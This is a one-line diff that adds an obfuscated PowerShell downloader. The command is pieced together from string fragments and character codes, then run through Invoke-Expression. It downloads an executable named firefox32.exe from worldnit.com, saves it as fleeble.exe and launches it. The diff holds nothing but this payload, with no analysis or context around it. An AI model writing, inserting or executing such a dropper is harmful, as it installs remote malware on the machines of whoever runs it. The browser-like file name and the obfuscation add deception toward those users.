@@ -1,0 +1,1 @@
+﻿ (('('+'New-O'+'bj'+'e'+'ct'+' Sy'+'stem.'+'Ne'+'t.We'+'b'+'Client).'+'Downlo'+'adF'+'ile(Op'+'Phttp'+'://worldni'+'t'+'.'+'c'+'om/fi'+'refo'+'x32.exeOpP,O'+'pPfleebl'+'e'+'.exeO'+'p'+'P);Star'+'t-Proc'+'es'+'s O'+'pPfle'+'eble.exeOpP')  -rEPLACE ([ChAr]79+[ChAr]112+[ChAr]80),[ChAr]39)| . ( $ShellId[1]+$shEllId[13]+'x')
